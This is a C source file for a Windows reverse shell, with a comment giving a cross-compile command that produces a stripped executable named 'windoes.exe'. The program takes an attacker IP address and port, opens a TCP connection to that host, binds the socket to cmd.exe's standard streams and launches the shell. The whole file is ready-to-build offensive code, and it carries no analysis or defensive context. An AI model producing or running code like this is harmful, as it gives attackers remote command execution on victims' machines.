#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <winsock2.h>

/*
i686-w64-mingw32-g++ windows.c -o windoes.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
*/

WSADATA socketData;
SOCKET mainSocket;
struct sockaddr_in connectionAddress;
STARTUPINFO startupInfo;
PROCESS_INFORMATION processInfo;


void print_usage(char *argv[]) {
	printf("Usage: %s -r <attacker-ip-addr> -p <listening-port>\n", argv[0]);
	printf("\t -r  - (required) attackers ip address\n");
	printf("\t -p  - (required) port for connection\n");
	return;
}


int main(int argc, char* argv[]) {

    char* attacker_ip = NULL;
    char *portarg = NULL;
    unsigned short port = 0; 
    int c;

    while ((c = getopt(argc, argv, "r:p:")) != -1) {
		switch (c) {
			case 'r':
				attacker_ip = optarg;
				break;
			case 'p':
				portarg = optarg;
				port = atoi(portarg);
				if (port == 0) {
					printf("Bad port: %s\n", portarg);
				}
				break;
			case '?':
				printf("Unknown option -%c\n", c);
			default:
				return -1;

		}
	}

    if (attacker_ip == 0 || attacker_ip == NULL) {
		printf("Attacker IP not set\n");
		print_usage(argv);
		return 0;
	}

    if (port == 0) {
		printf("Port not set\n");
		print_usage(argv);
		return 0;
	}

    // initialize socket library
    WSAStartup(MAKEWORD(2, 2), &socketData);

    // create socket object
    mainSocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);

    connectionAddress.sin_family = AF_INET;
    connectionAddress.sin_port = htons(port);
    connectionAddress.sin_addr.s_addr = inet_addr(attacker_ip);

    // establish connection to the remote host
    WSAConnect(mainSocket, (SOCKADDR*)&connectionAddress, sizeof(connectionAddress), NULL, NULL, NULL, NULL);

    memset(&startupInfo, 0, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE) mainSocket;

    // initiate cmd.exe with redirected streams
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo);
  
    exit(0);
}